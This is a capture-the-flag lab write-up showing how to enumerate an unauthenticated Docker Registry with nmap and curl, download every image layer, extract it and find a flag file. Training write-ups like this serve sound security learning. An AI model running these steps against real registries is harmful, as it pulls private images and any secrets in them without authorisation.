### Name : Insecure Docker Registry II  
### URL : https://www.attackdefense.com/challengedetails?cid=1025  
### Type DevSecOps : Docker Registry  
  
  
Important Note: This document illustrates all the important steps required to complete this lab.
This is by no means a comprehensive step-by-step solution for this exercise. This is only
provided as a reference to various commands needed to complete this exercise and for your
further research on this topic.

Insecure Docker Registry
========================

attacker = 192.111.246.2  
target = 192.111.246.3

#### 1. Scan target machine

```
root@attackdefense:~# nmap -p- -sV 192.111.246.3
Starting Nmap 7.70 ( https://nmap.org ) at 2020-10-01 03:09 UTC
Nmap scan report for target-1 (192.111.246.3)
Host is up (0.000014s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
5000/tcp open  http    Docker Registry (API: 2.0)
MAC Address: 02:42:C0:6F:F6:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.14 seconds
```
Discover docker registry on port 5000

#### 2. Interact to API using curl

```
## list repository catalog
root@attackdefense:~# curl http://192.111.246.3:5000/v2/_catalog
{"repositories":["treasure-trove"]}

## list tags for each repository
root@attackdefense:~# curl http://192.111.246.3:5000/v2/treasure-trove/tags/list
{"name":"treasure-trove","tags":["latest"]}
```

#### 3. Pull manifest for the image

```
root@attackdefense:~# curl http://192.111.246.3:5000/v2/treasure-trove/manifests/latest
{
   "schemaVersion": 1,
   "name": "treasure-trove",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10"
      }
   ],
```

#### 4. Download all image layer to .tar file

```
root@attackdefense:~# curl -s http://192.111.246.3:5000/v2/treasure-trove/blobs/sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935 --output 1.tar
root@attackdefense:~# curl -s http://192.111.246.3:5000/v2/treasure-trove/blobs/sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 --output 2.tar
root@attackdefense:~# curl -s http://192.111.246.3:5000/v2/treasure-trove/blobs/sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10 --output 3.tar
root@attackdefense:~# ls
1.tar  2.tar  3.tar
```

#### 5. Extract image

```
root@attackdefense:~# mkdir image
root@attackdefense:~# mv *.tar image
root@attackdefense:~# cd image/
root@attackdefense:~/image# for i in 1 2 3; do tar -xf $i.tar; done
root@attackdefense:~/image# ls
1.tar  2.tar  3.tar  bin  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@attackdefense:~/image#
```

#### 6. Find the flag

```
root@attackdefense:~/image# find . -name *flag* 2> /dev/null
./etc/network/if-post-up.d/flag.txt
root@attackdefense:~/image# cat etc/network/if-post-up.d/flag.txt
c09f6e2ecff56dcae50c02c6a4d355fe
root@attackdefense:~/image#
```
